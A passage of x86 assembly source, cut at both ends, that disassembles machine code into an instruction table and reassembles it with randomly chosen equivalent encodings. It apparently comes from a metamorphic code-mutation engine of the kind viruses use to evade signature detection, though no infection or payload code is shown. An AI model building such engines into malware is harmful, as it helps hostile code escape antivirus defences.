                mov     [edi+1], eax  
                mov     eax, [esi]
                and     eax, 58h      
                mov     edx, [edi]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax   
                add     esi, 1
                jmp   @@NextInstruction

  @@Op_PUSHValue:
                mov     [edi], eax   
                mov     eax, [esi+1] 
                mov     [edi+7], eax
                add     esi, 5       
                jmp   @@NextInstruction

  @@Op_PUSHSignedValue:
                mov     eax, 68h     
                mov     [edi], eax
                mov     eax, [esi+1] 
                and     eax, 0FFh    
                cmp     eax, 7Fh
                jbe   @@Op_PUSHSignedValue_01
                add     eax, 0FFFFFF00h                
         @@Op_PUSHSignedValue_01:
                mov     [edi+7], eax 
                add     esi, 2       
                jmp   @@NextInstruction

      @@GenericOpcode2:
                and     eax, 1     
                or      eax, eax
                jz    @@Gen2_8b    
      @@Gen2_32b:
                mov     eax, [esi+1]    
                and     eax, 38h
                mov     edx, [edi]      
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                mov     eax, [esi]
                and     eax, 2          
                or      eax, eax        
                jnz   @@Gen2_Gen_Signed
      @@Gen32Value:
                mov     eax, [esi+1]    
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@Gen2_32b_Register
                mov     eax, [edi]      
                add     eax, 4          
                mov     [edi], eax
                mov     edx, esi        
                add     edx, 1
                call    DecodeMemoryConstruction
                add     esi, ebx        
                mov     eax, [esi+1]    
                sub     esi, ebx        
                add     esi, 3          
                jmp   @@Gen2_Gen_Memory

      @@Gen2_32b_Register:
                mov     eax, [esi+2]    
                mov     [edi+7], eax    
                mov     eax, [esi+1]    
                add     esi, 6          
                jmp   @@Gen2_Gen_Register

      @@Gen2_8b:
                mov     eax, [esi+1]    
                and     eax, 38h        
                add     eax, 80h        
                mov     edx, [edi]      
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
      @@Gen2_Gen_Signed:
      @@Gen8Value:
                mov     eax, [esi+1]    
                and     eax, 0C0h
                cmp     eax, 0C0h       
                jz    @@Gen2_8b_Register
                mov     eax, [edi]      
                add     eax, 4
                mov     [edi], eax
                mov     edx, esi        
                add     edx, 1
                call    DecodeMemoryConstruction
                xor     eax, eax        
                add     esi, ebx
                mov     eax, [esi+1]
                sub     esi, ebx
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@Gen8Value_01
                add     eax, 0FFFFFF00h
          @@Gen8Value_01:

      @@Gen2_Gen_Memory:
                mov     [edi+7], eax    
                add     esi, ebx
                add     esi, 2          
                jmp   @@NextInstruction 

      @@Gen2_8b_Register:
                mov     eax, [esi+2]    
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@Gen2_8b_Register_01
                add     eax, 0FFFFFF00h
         @@Gen2_8b_Register_01:
                mov     [edi+7], eax    
                mov     eax, [esi+1]    
                add     esi, 3          
      @@Gen2_Gen_Register:              
                and     eax, 7          
                mov     edx, [edi+1]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+1], eax    
                jmp   @@NextInstruction 


     @@LEA:     mov     eax, 0FCh      
                mov     [edi], eax
                mov     edx, esi
                add     edx, 1         
                call    DecodeMemoryConstruction
                mov     eax, [esi+1]
                and     eax, 38h       
                shr     eax, 3
                mov     [edi+7], eax
                add     esi, ebx
                add     esi, 1          
                jmp   @@NextInstruction 



     @@POPMem:  mov     eax, [esi+1]  
                and     eax, 0C0h     
                cmp     eax, 0C0h
                jz    @@POPMem_butReg
                mov     eax, 59h      
                mov     [edi], eax    
                mov     edx, esi
                add     edx, 1
                call    DecodeMemoryConstruction
                add     esi, ebx
                add     esi, 1
                jmp   @@NextInstruction
     @@POPMem_butReg:                 
                mov     eax, [esi+1]
                and     eax, 7
                mov     [edi+1], eax
                mov     eax, 58h      
                mov     edx, [edi]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                add     esi, 2
                jmp   @@NextInstruction


     @@NOP:     mov     eax, 0FFh  
                mov     [edi], eax
                add     esi, 1
                jmp   @@NextInstruction

     @@TESTALValue:
                mov     eax, [esi+1]  
                and     eax, 0FFh
                mov     ecx, eax      
                mov     eax, 0C8h     
                add     esi, 2
     @@TESTxAxValue:
                mov     [edi], eax    
                xor     eax, eax      
                mov     [edi+1], eax
                mov     [edi+7], ecx  
                jmp   @@NextInstruction


     @@TESTEAXValue:
                mov     ecx, [esi+1]  
                mov     eax, 48h      
                add     esi, 5        
                jmp   @@TESTxAxValue



     @@MOVRegValue:
                mov     eax, 40h      
                mov     [edi], eax
                mov     ecx, [esi+1]  
                mov     eax, [esi]
                add     esi, 5
     @@MOVRegValue_Common:
                and     eax, 7        
                mov     [edi+1], eax  
                mov     [edi+7], ecx  
                jmp   @@NextInstruction
     @@MOVReg8Value:
                mov     eax, 0C0h
                mov     [edi], eax    
                mov     eax, [esi+1]  
                and     eax, 0FFh
                mov     ecx, eax
                mov     eax, [esi]    
                add     esi, 2
                jmp   @@MOVRegValue_Common

      @@BitShifting32:
                mov     eax, 0F0h     
      @@BitShifting_Common:
                mov     [edi], eax    
                mov     eax, [esi+1]  
                and     eax, 38h      
                mov     edx, [edi+8]  
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+8], eax
                mov     eax, [esi+1]  
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@BS32_Reg      
                mov     eax, [edi]
                add     eax, 1
                mov     [edi], eax    
                mov     edx, esi
                add     edx, 1        
                call    DecodeMemoryConstruction
       @@BS32_Common:
                mov     eax, [esi]    
                and     eax, 0FFh
                cmp     eax, 0D0h     
                jb    @@BS32_GetNumber 
                mov     eax, 1        
                sub     esi, 1
                jmp   @@BS32_SetNumber
       @@BS32_GetNumber:
                add     esi, ebx      
                mov     eax, [esi+1]
                sub     esi, ebx
       @@BS32_SetNumber:
                and     eax, 1Fh      
                mov     edx, [edi+7]  
                and     edx, 0FFFFFF00h  
                add     eax, edx
                mov     [edi+7], eax
                add     esi, ebx
                add     esi, 2
                jmp   @@NextInstruction
       @@BS32_Reg:
                mov     eax, [esi+1]  
                and     eax, 7
                mov     [edi+1], eax  
                mov     ebx, 1        
                jmp   @@BS32_Common

       @@BitShifting8:
                mov     eax, 0F2h     
                jmp   @@BitShifting_Common


       @@MOVMem8Value:
                mov     eax, 0C4h     
                mov     [edi], eax
                mov     eax, [esi+1]  
                and     eax, 0C0h     
                cmp     eax, 0C0h
                jz    @@MOVMem8_RegValue  
                mov     edx, esi
                add     edx, 1        
                call    DecodeMemoryConstruction
                add     esi, ebx      
                add     esi, 1
       @@MOVMem8Value_Common:
                mov     eax, [esi]    
                and     eax, 0FFh     
                cmp     eax, 7Fh
                jbe   @@MOVMem8Value_01
                add     eax, 0FFFFFF00h
          @@MOVMem8Value_01:
                mov     [edi+7], eax  
                add     esi, 1
                jmp   @@NextInstruction
       @@MOVMem8_RegValue:
                mov     eax, 0C0h     
                mov     [edi], eax    
                mov     eax, [esi+1]
                and     eax, 7
                mov     [edi+1], eax  
                add     esi, 2
                jmp   @@MOVMem8Value_Common 


       @@MOVMem32Value:
                mov     eax, 44h      
                mov     [edi], eax    
                mov     eax, [esi+1]  
                and     eax, 0C0h
                cmp     eax, 0C0h     
                jz    @@MOVMem32_RegValue  
                mov     edx, esi
                add     edx, 1        
                call    DecodeMemoryConstruction
                add     esi, ebx      
                add     esi, 1
                mov     eax, [esi]    
                mov     [edi+7], eax  
                add     esi, 4        
                jmp   @@NextInstruction
      @@MOVMem32_RegValue:
                mov     eax, 40h      
                mov     [edi], eax    
                mov     eax, [esi+1]
                and     eax, 7
                mov     [edi+1], eax  
                mov     eax, [esi+2]  
                mov     [edi+7], eax
                add     esi, 6        
                jmp   @@NextInstruction

    @@SomeNotVeryCommon8:
                mov     eax, [esi+1]  
                and     eax, 38h
                or      eax, eax      
                jz    @@TEST8Value
                shr     eax, 1        
                add     eax, 0DAh     
    @@SNVC_Gen: mov     [edi], eax    
                mov     eax, [esi+1]  
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@NOTNEGReg8    
                mov     eax, [edi]    
                add     eax, 1
                mov     [edi], eax
                mov     edx, esi      
                add     edx, 1
                call    DecodeMemoryConstruction
                add     esi, ebx      
                add     esi, 1
                jmp   @@NextInstruction
    @@NOTNEGReg8:
                mov     eax, [esi+1]  
                and     eax, 7
                mov     edx, [edi+1]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+1], eax  
                add     esi, 2        
                jmp   @@NextInstruction

    @@SomeNotVeryCommon32:
                mov     eax, [esi+1]  
                and     eax, 38h
                or      eax, eax      
                jz    @@TEST32Value
                shr     eax, 1
                add     eax, 0D8h     
                jmp   @@SNVC_Gen      

    @@TEST8Value:
                mov     eax, 0C8h     
                mov     [edi], eax
                jmp   @@Gen8Value     

    @@TEST32Value:
                mov     eax, 48h      
                mov     [edi], eax
                jmp   @@Gen32Value    


    @@INCDECMem8:
                mov     eax, [esi+1]  
                and     eax, 38h
                or      eax, eax      
                jz    @@INCMem8       
    @@DECMem8:  mov     eax, 0ACh     
      @@INCDECMem8_Next:
                mov     [edi], eax    
                mov     eax, [esi+1]  
                and     eax, 0C0h
                cmp     eax, 0C0h     
                jz    @@INCDECReg8
      @@INCDECPUSH_Gen:
                mov     edx, esi      
                add     edx, 1        
                call    DecodeMemoryConstruction
                add     esi, ebx
                add     esi, 1
                mov     eax, 1        
                mov     [edi+7], eax  
                                      
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 0EBh     
                jnz   @@NextInstruction  
                                         
                add     edi, 10h      
                jmp   @@GetEIPFromFutureLabelList 
    @@INCDECReg8:
                mov     eax, [edi]    
                sub     eax, 4        
                mov     [edi], eax
                mov     eax, [esi+1]  
                and     eax, 7
                mov     [edi+1], eax  
                mov     eax, 1        
                mov     [edi+7], eax  
                add     esi, 2
                jmp   @@NextInstruction
    @@INCMem8:  mov     eax, 84h      
                jmp   @@INCDECMem8_Next


    @@INCDECPUSHMem32:
                mov     eax, [esi+1]  
                and     eax, 38h
                or      eax, eax      
                jz    @@INCMem32
                cmp     eax, 08h      
                jz    @@DECMem32
                cmp     eax, 10h      
                jz    @@CALLMem32
                cmp     eax, 20h      
                jz    @@JMPMem32
       @@PUSHMem32:
                mov     eax, [esi+1]  
                and     eax, 0C0h     
                cmp     eax, 0C0h
                jz    @@PUSHMem32_Reg
                mov     eax, 51h      
                mov     [edi], eax
                jmp   @@INCDECPUSH_Gen
       @@PUSHMem32_Reg:
                mov     eax, 50h      
       @@INCDECPUSH_GenMem32_Reg:
                mov     [edi], eax    
                mov     eax, [esi+1]  
                and     eax, 7
                mov     [edi+1], eax
                mov     eax, 1        
                mov     [edi+7], eax  
                add     esi, 2
                mov     eax, [edi]    
                and     eax, 0FFh
                cmp     eax, 0EDh     
                jnz   @@NextInstruction
                add     edi, 10h      
                jmp   @@GetEIPFromFutureLabelList

       
       @@INCMem32:
                mov     eax, [esi+1]  
                and     eax, 0C0h     
                cmp     eax, 0C0h     
                jz    @@INCReg32
                mov     eax, 4        
                jmp   @@INCDECMem8_Next
       @@INCReg32:
                xor     eax, eax      
                jmp   @@INCDECPUSH_GenMem32_Reg
       
       @@DECMem32:
                mov     eax, [esi+1]  
                and     eax, 0C0h     
                cmp     eax, 0C0h
                jz    @@DECReg32
                mov     eax, 2Ch      
                jmp   @@INCDECMem8_Next
       @@DECReg32:
                mov     eax, 28h      
                jmp   @@INCDECPUSH_GenMem32_Reg

       
       @@CALLMem32:
                mov     eax, [esi+1]
                and     eax, 0C0h     
                cmp     eax, 0C0h
                jz    @@CALLMem32_Reg
                mov     eax, 0EAh     
                mov     [edi], eax
                jmp   @@INCDECPUSH_Gen
       @@CALLMem32_Reg:
                mov     eax, 0ECh     
                jmp   @@INCDECPUSH_GenMem32_Reg
       @@JMPMem32:
                mov     eax, [esi+1]
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@JMPMem32_Reg
                mov     eax, 0EBh    
                mov     [edi], eax   
                jmp   @@INCDECPUSH_Gen
       @@JMPMem32_Reg:
                mov     eax, 0EDh    
                jmp   @@INCDECPUSH_GenMem32_Reg 

     @@NextInstruction:
                add     edi, 10h     
                jmp   @@ContinueDissasembly


     @@RET:     mov     eax, 0FEh   
                mov     [edi], eax
                inc     esi
                add     edi, 10h    
                jmp   @@GetEIPFromFutureLabelList 
                                                  

     @@JMP8:    mov     eax, [esi+1] 
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@JMP8_01
                add     eax, 0FFFFFF00h
          @@JMP8_01:
                add     eax, 2       
                add     eax, esi     
                jmp   @@JMP_Next01


     @@JMP:     mov     eax, [esi+1] 
                add     eax, 5
                add     eax, esi


     @@JMP_Next01:
                mov     ebx, [ebp+InstructionTable]
                cmp     ebx, edi
                jz    @@NoInstructions
           @@FindDestinyInTable:
                cmp     [ebx+0Ch], eax  
                jz    @@SetLabel        
                                        
                add     ebx, 10h
                cmp     ebx, edi
                jnz   @@FindDestinyInTable
       @@NoInstructions:
                mov     ecx, 0FFh       
                mov     [edi], ecx      
                add     edi, 10h        
                mov     esi, eax        
                jmp   @@LoopTrace       
                                        
       @@SetLabel:
                mov     ecx, 0E9h       
                mov     [edi], ecx
                mov     edx, esi        
                mov     [edi+0Ch], edx
                add     edi, 10h
                push    eax
                mov     eax, [esi]      
                and     eax, 0FFh
                mov     ecx, eax
                pop     eax
                cmp     ecx, 0EBh       
                jz    @@Add2ToEIP       
                add     esi, 3
        @@Add2ToEIP:
                add     esi, 2

                call    InsertLabel     

                mov     [edi+1-10h], edx 

   @@GetEIPFromFutureLabelList:
                mov     ecx, [ebp+NumberOfLabelsPost]
                or      ecx, ecx        
                jz    @@FinDeTraduccion
                mov     ebx, [ebp+FutureLabelTable]
       @@LoopCheckForNewEIP:
                mov     eax, [ebx]      
                or      eax, eax        
                jnz   @@GetNewEIP       
                add     ebx, 8          
                sub     ecx, 1
                or      ecx, ecx        
                jnz   @@LoopCheckForNewEIP
                jmp   @@FinDeTraduccion 

       @@GetNewEIP:
                mov     esi, [ebx]
                jmp   @@LoopTrace


     @@Opcode0F:
                mov     eax, [esi+1]  
                and     eax, 0FFh
                cmp     eax, 80h      
                jb    @@Op0F_Next00
                cmp     eax, 8Fh
                jbe   @@Jcc32         
       @@Op0F_Next00:
                cmp     eax, 0B6h     
                jz    @@Op0F_MOVZX

                add     esi, 2        
                jmp   @@DefineInstr

       @@Op0F_MOVZX:
                mov     eax, 0F8h     
                mov     [edi], eax
                mov     eax, [esi+2]  
                and     eax, 38h
                shr     eax, 3
                mov     [edi+7], eax  
                mov     edx, esi      
                add     edx, 2
                call    DecodeMemoryConstruction
                add     esi, ebx
                add     esi, 2
                jmp   @@NextInstruction


     @@Jcc32:   mov     eax, [esi+2]  
                add     eax, esi
                add     eax, 6
                jmp   @@ContinueWithBranchInstr

     @@CALL:    mov     eax, [esi+1]  
                add     eax, esi
                add     eax, 5
                jmp   @@ContinueWithBranchInstr


     @@Jcc:     mov     eax, [esi+1] 
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@Jcc_01
                add     eax, 0FFFFFF00h
          @@Jcc_01:
                add     eax, esi
                add     eax, 2

     @@ContinueWithBranchInstr:
                mov     ecx, eax              
                call    SetInFutureLabelList  
                push    eax                   
                mov     eax, [esi]
                and     eax, 0FFh    
                cmp     eax, 0Fh     
                jz    @@Jcc_Jcc32
                
                cmp     eax, 0E8h    
                jz    @@Jcc_AddEIP5  
                jmp   @@Jcc_AddEIP2

   @@Jcc_Jcc32:
                mov     eax, [esi+1] 
                and     eax, 0FFh
                sub     eax, 10h     

    @@Jcc_AddEIP6:
                inc     esi
    @@Jcc_AddEIP5:
                add     esi, 3
    @@Jcc_AddEIP2:
                add     esi, 2       
                mov     edx, [edi]   
                and     edx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, edx
                mov     [edi], eax

                pop     eax
                or      eax, eax     
                jz    @@NextInstruction 
                                        

                call    InsertLabel  
                mov     [edi+1], edx 
                jmp   @@NextInstruction 

     @@FinDeTraduccion:   
                ret
DisasmCode      endp

SetInFutureLabelList proc
                mov     ebx, [ebp+InstructionTable] 
                cmp     ebx, edi         
                jz    @@SetFutureLabel   
      @@LoopCheckLabelForJcc:            
                cmp     [ebx+0Ch], eax
                jz    @@Jcc_CodeDefined  
                add     ebx, 10h
                cmp     ebx, edi         
                jnz   @@LoopCheckLabelForJcc
      @@SetFutureLabel:                  
                mov     edx, [ebp+NumberOfLabelsPost]
                shl     edx, 3
                add     edx, [ebp+FutureLabelTable]
                mov     [edx], eax       
                mov     [edx+4], edi     
                mov     eax, [ebp+NumberOfLabelsPost]
                add     eax, 1                        
                mov     [ebp+NumberOfLabelsPost], eax 
                xor     eax, eax               
      @@Jcc_CodeDefined:
                ret
SetInFutureLabelList endp


ReleaseFutureLabels proc
                mov     ecx, [ebp+NumberOfLabelsPost] 
                or      ecx, ecx
                jz    @@DefineInstr                    
                mov     ebx, [ebp+FutureLabelTable]
      @@LoopCheckFutureLabel:
                cmp     [ebx], esi        
                jz    @@FutureLabelFound  
      @@OtherFutureLabel:
                add     ebx, 8        
                dec     ecx
                or      ecx, ecx      
                jnz   @@LoopCheckFutureLabel
      @@DefineInstr:
                ret
      @@FutureLabelFound:
                push    ecx

                push    ebx           
                mov     eax, esi
                mov     ebx, edi
                call    InsertLabel
                pop     ebx           

                mov     eax, [ebx+4]  
                mov     [eax+1], edx  
                xor     ecx, ecx
                mov     [ebx], ecx    
                pop     ecx
                jmp   @@OtherFutureLabel 
ReleaseFutureLabels endp


InsertLabel     proc
                mov     edx, [ebp+LabelTable]  
                mov     ecx, [ebp+NumberOfLabels]
                or      ecx, ecx               
                jz    @@Jcc_InsertLabel        
      @@Jcc_LoopLabel:
                cmp     [edx], eax            
                jz    @@Jcc_LabelStillExists  
                add     edx, 8
                dec     ecx                   
                or      ecx, ecx
                jnz   @@Jcc_LoopLabel
      @@Jcc_InsertLabel:            
                mov     [edx], eax      
                mov     [edx+4], ebx    
                push    eax
                mov     eax, [ebx+0Bh]  
                and     eax, 0FFFFFF00h 
                add     eax, 1
                mov     [ebx+0Bh], eax
                mov     eax, [ebp+NumberOfLabels] 
                add     eax, 1                    
                mov     [ebp+NumberOfLabels], eax
                pop     eax             
      @@Jcc_LabelStillExists:
                ret
InsertLabel     endp


GenOp_SetRegReg proc
                push    edx
                mov     edx, [edi]
                and     edx, 0FFFFFF00h
                mov     eax, [esi]  
                and     eax, 0FFh
                cmp     eax, 3Fh    
                jbe   @@SRR_01      
                cmp     eax, 85h    
                jbe   @@SRR_02
                cmp     eax, 8Bh    
                jbe   @@SRR_04
     @@SRR_01:  and     eax, 38h    
                add     eax, 1
     @@SRR_Store:
                add     eax, edx
                mov     [edi], eax  
                pop     edx
                ret                 
     @@SRR_02:  mov     eax, 48h+1  
                jmp   @@SRR_Store
 
     @@SRR_04:  mov     eax, 40h+1  
                jmp   @@SRR_Store
GenOp_SetRegReg endp

;---------------------------------------------------------------------------------------

AssembleCode    proc
                xor     eax, eax
                mov     [ebp+NumberOfJumpRelocations], eax 
                                            
                mov     esi, [ebp+InstructionTable]
                mov     edi, [ebp+NewAssembledCode]
      
                mov     ecx, [ebp+NumberOfLabels]   
                mov     edx, [ebp+LabelTable]       
     @@LoopSetLabel:                                
                mov     ebx, [edx+4]                
                mov     eax, [ebx+0Bh]              
                or      eax, 01h
                mov     [ebx+0Bh], eax
                add     edx, 8
                dec     ecx
                or      ecx, ecx
                jnz   @@LoopSetLabel

   @@LoopAssemble_01:
                mov     eax, [esi+0Bh]      
                and     eax, 0FFh           
                cmp     eax, 1
                jnz   @@Assemble_Instruction
                mov     eax, [ebp+NumberOfLabels] 
                mov     edx, [ebp+LabelTable]
   @@LoopCheckLabel:
                cmp     [edx+4], esi        
                jnz   @@CheckNextLabel      
                mov     [edx], edi          
   @@CheckNextLabel:
                add     edx, 8              
                dec     eax
                or      eax, eax
                jnz   @@LoopCheckLabel
   @@Assemble_Instruction:
                call    AssembleInstruction 
                add     esi, 10h            
                mov     eax, [ebp+AddressOfLastInstruction]
                cmp     esi, eax            
                jb    @@LoopAssemble_01     
                mov     [ebp+AddressOfLastInstruction], edi 
                                                            
                mov     eax, edi
                sub     eax, [ebp+NewAssembledCode] 
                mov     [ebp+SizeOfNewCode], eax
                add     eax, 20h            
                                            
                mov     ebx, 0F000h     
   @@LoopGetRoundedSize:                
                add     ebx, 1000h      
                cmp     ebx, eax
                jb    @@LoopGetRoundedSize
                mov     [ebp+RoundedSizeOfNewCode], ebx

                mov     eax, 4000h      
   @@LoopGetSizeP2:                     
                shl     eax, 1          
                cmp     eax, [ebp+SizeOfNewCode]
                jb    @@LoopGetSizeP2
                mov     [ebp+SizeOfNewCodeP2], eax

    
                mov     esi, [ebp+JumpRelocationTable]
                mov     ecx, [ebp+NumberOfJumpRelocations]

    @@LoopReloc01:
                mov     edi, [esi]    
                mov     eax, [esi+4]
                mov     eax, [eax]    
                mov     edx, edi      
                add     edx, 5        
                sub     eax, edx      
                mov     ebx, [edi]    
                and     ebx, 0FFh
                cmp     ebx, 7Fh      
                jbe   @@Short
                cmp     ebx, 0EBh     
                jz    @@Short
                mov     [edi+1], eax  
     @@Next:    sub     ecx, 8        
                add     esi, 8        
                or      ecx, ecx
                jnz   @@LoopReloc01
                ret
     @@Short:   add     eax, 3        
                                      
                mov     [edi+1], al   
                jmp   @@Next          
AssembleCode    endp


Asm_AddToRelocTable proc
                mov     ebx, [ebp+JumpRelocationTable] 
                mov     ecx, [ebp+NumberOfJumpRelocations] 
                add     ebx, ecx
                mov     [ebx], edi        
                mov     eax, [esi+1]      
                mov     [ebx+4], eax
                add     ecx, 8            
                mov     [ebp+NumberOfJumpRelocations], ecx
                ret
Asm_AddToRelocTable endp


Asm_MakeMemoryAddress proc
                mov     ecx, [esi+1]
                and     ecx, 0FFh
                mov     eax, [esi+2]
                and     eax, 0FFh
                cmp     eax, ecx
                jae   @@Next00
                mov     edx, eax
                jmp   @@Next01
   @@Next00:    mov     edx, ecx
                mov     ecx, eax
   

   @@Next01:    cmp     edx, 8         
                jz    @@NoIndex1       
                cmp     ecx, 8         
                jz    @@Only1Index
                cmp     ecx, 7
                ja    @@NoExchange
                call    Random
                and     eax, 1
                jz    @@NoExchange
                mov     eax, ecx
                mov     ecx, edx
                mov     edx, eax
   @@NoExchange:
                mov     eax, [esi+3]
                or      eax, eax
                jz    @@2Index_0
                cmp     eax, 7Fh
                jbe   @@2Index_Byte
                cmp     eax, 0FFFFFF80h
                jae   @@2Index_Byte
   @@2Index_Dword:
                mov     eax, 84h
   @@2Index_Dword_Subr:
                push    eax
                mov     eax, ecx
                and     eax, 0C0h
                shl     ecx, 3
                and     ecx, 38h
                add     eax, ecx
                add     edx, eax
                pop     eax
                jmp   @@SetMemory01
   @@2Index_Byte:
                call    Random
                and     eax, 1
                jz    @@2Index_Dword
                mov     eax, 44h
                call  @@2Index_Dword_Subr
                sub     edi, 3
                ret
   @@2Index_0:
                call    Random
                and     eax, 1
                jz    @@2Index_Byte
                cmp     edx, 5
                jz    @@2Index_Byte
                mov     eax, 04h
                call  @@2Index_Dword_Subr
                sub     edi, 4
                ret

   @@Only1Index:
                
                mov     eax, [esi+3]
                or      eax, eax
                jz    @@Only1Index_0
                cmp     eax, 7Fh
                jbe   @@Only1Index_Byte
                cmp     eax, 0FFFFFF80h
                jae   @@Only1Index_Byte
   @@Only1Index_Dword:
                call    Random
                and     eax, 3
                or      eax, eax
                jz    @@Only1Index_Dword
                cmp     eax, 1
                jz    @@Only1Index_Dword_01
                cmp     eax, 2
                jz    @@Only1Index_Dword_02
   @@Only1Index_Dword_03:
                mov     eax, 84h
                add     edx, 20h
                jmp   @@SetMemory01
   @@Only1Index_Dword_02:
                mov     eax, 04h
                shl     edx, 3
                add     edx, 5
                jmp   @@SetMemory01
   @@Only1Index_Dword_01:
                add     edx, 80h
                add     edx, ebx
                mov     [edi], edx
                mov     eax, [esi+3]
                mov     [edi+1], eax
                add     edi, 5
                ret
   @@Only1Index_Byte:
                call    Random
                and     eax, 1
                jz    @@Only1Index_Dword
                call    Random
                and     eax, 1
                jz    @@Only1Index_Byte_01
   @@Only1Index_Byte_02:
                mov     eax, 44h
                add     eax, ebx
                mov     [edi], eax
                add     edx, 20h
                mov     [edi+1], edx
                mov     eax, [esi+3]
                mov     [edi+2], eax
                add     edi, 3
                ret
   @@Only1Index_Byte_01:
                add     edx, 40h
                add     edx, ebx
                mov     [edi], edx
                mov     eax, [esi+3]
                mov     [edi+1], eax
                add     edi, 2
                ret
   @@Only1Index_0:
                call    Random
                and     eax, 1
                jz    @@Only1Index_Byte
                cmp     edx, 5
                jz    @@Only1Index_Byte
                add     edx, ebx
                mov     [edi], edx
                add     edi, 1
                ret

   @@NoIndex1:  cmp     ecx, 8   
                jz    @@DirectAddress
                mov     edx, ecx
                and     edx, 0C0h
                and     ecx, 7
                shl     ecx, 3
                add     edx, ecx
                add     edx, 5
                mov     eax, 4
   @@SetMemory01:
                add     eax, ebx
                mov     [edi], eax
                mov     [edi+1], edx
                mov     eax, [esi+3]
                mov     [edi+2], eax
                add     edi, 6
                ret
   @@DirectAddress:
                mov     eax, 05h
                add     eax, ebx
                mov     [edi], eax
                mov     eax, [esi+3]
                mov     [edi+1], eax
                add     edi, 5
                ret
Asm_MakeMemoryAddress endp


AssembleInstruction proc
                mov     [esi+0Ch], edi 
                mov     eax, [esi]
                and     eax, 0FFh       
                cmp     eax, 4Ch        
                ja    @@Assemble_Next00 
                mov     ebx, eax
                and     ebx, 0F8h
                and     eax, 7                   
                or      eax, eax                 
                jz    @@Assemble_OPRegImm
                cmp     eax, 1                   
                jz    @@Assemble_OPRegReg
                cmp     eax, 2                   
                jz    @@Assemble_OPRegMem
                cmp     eax, 3                   
                jz    @@Assemble_OPMemReg
     @@Assemble_OPMemImm:                        
                cmp     ebx, 38h                 
                jbe   @@Assemble_OPMemImm_Normal              
                cmp     ebx, 40h                     
                jz    @@Assemble_MOVMemImm
     @@Assemble_TESTMemImm:                          
                xor     ebx, ebx        
                mov     eax, 0F7h                    
                jmp   @@Assemble_OPMemImm_Normal_00
     @@Assemble_MOVMemImm:
                xor     ebx, ebx                     
                mov     eax, 0C7h
                jmp   @@Assemble_OPMemImm_Normal_00
     @@Assemble_OPMemImm_Normal:
                mov     eax, [esi+7]                 
                cmp     eax, 7Fh                     
                jbe   @@Assemble_OPMemImm_Normal_Byte 
                cmp     eax, 0FFFFFF80h
                jae   @@Assemble_OPMemImm_Normal_Byte
     @@Assemble_OPMemImm_Normal_Dword:
                mov     eax, 81h             
     @@Assemble_OPMemImm_Normal_00:
                mov     [edi], eax           
                add     edi, 1             
                call    Asm_MakeMemoryAddress 
                mov     eax, [esi+7]       
                mov     [edi], eax
                add     edi, 4             
                ret                        
     @@Assemble_OPMemImm_Normal_Byte:
                call    Random
                and     eax, 1
                jz    @@Assemble_OPMemImm_Normal_Dword 
                mov     eax, 83h           
                mov     [edi], eax
                add     edi, 1                
                call    Asm_MakeMemoryAddress 
                mov     eax, [esi+7]       
                mov     [edi], eax
                add     edi, 1             
                ret                        


     @@Assemble_OPRegImm:
                cmp     ebx, 38h           
                jbe   @@Assemble_OPRegImm_Normal
                cmp     ebx, 40h                     
                jz    @@Assemble_MOVRegImm
     @@Assemble_TESTRegImm:                          
                mov     eax, [esi+1]                 
                and     eax, 7
                or      eax, eax              
                jnz   @@Assemble_TESTRegImm_NotEAX   
                call    Random
                and     eax, 1
                jz    @@Assemble_TESTRegImm_NotEAX 
                mov     eax, 0A9h             
                jmp   @@Assemble_OPRegImm_OneByteOpcode
     @@Assemble_TESTRegImm_NotEAX:
                mov     eax, 0F7h             
                xor     ebx, ebx
                jmp   @@Assemble_OPRegImm_Normal_01

                                              
     @@Assemble_MOVRegImm:
                call    Random
                and     eax, 1
                jz    @@Assemble_MOVRegImm_OneByteOpcode 
                mov     eax, 0C7h             
                xor     ebx, ebx
                jmp   @@Assemble_OPRegImm_Normal_01
     @@Assemble_MOVRegImm_OneByteOpcode:
                mov     eax, [esi+1]          
                add     eax, 0B8h             
                jmp   @@Assemble_OPRegImm_OneByteOpcode 
     @@Assemble_OPRegImm_Normal:
                mov     eax, [esi+1]          
                and     eax, 7                
                or      eax, eax
                jnz   @@Assemble_OPRegImm_Normal_00 
                call    Random
                and     eax, 1
                jz    @@Assemble_OPRegImm_Normal_00 
                mov     eax, ebx              
                add     eax, 5                
     @@Assemble_OPRegImm_OneByteOpcode:
                mov     [edi], eax            
                mov     eax, [esi+7]
                mov     [edi+1], eax          
                add     edi, 5
                ret

     @@Assemble_OPRegImm_Normal_00:        
                mov     eax, 81h
     @@Assemble_OPRegImm_Normal_01:
                mov     [edi], eax                 
                mov     eax, [esi+1]               
                and     eax, 7                     
                add     eax, 0C0h                  
                add     eax, ebx                   
                mov     [edi+1], eax
                mov     eax, [esi+7]        
                mov     [edi+2], eax
                add     edi, 6              
                ret                         

     @@Assemble_OPRegReg:                   
                cmp     ebx, 38h
                jbe   @@Assemble_OPRegReg_Normal 
                cmp     ebx, 40h                      
                jz    @@Assemble_MOVRegReg
     @@Assemble_TESTRegReg:                           
                mov     ebx, 85h                  
     @@Assemble_TEST8RegReg_00:
                call    Random
                and     eax, 1
                jz    @@Assemble_OPRegReg_NextFF
                jmp   @@Assemble_OPRegReg_Inversed_2

     @@Assemble_MOVRegReg:
                mov     ebx, 88h        
     @@Assemble_OPRegReg_Normal:
                add     ebx, 1          
     @@Assemble_OP8RegReg_Normal:
                call    Random
                and     eax, 1
                jz    @@Assemble_OPRegReg_Inversed
     @@Assemble_OPRegReg_NextFF:
                mov     ecx, [esi+1]    
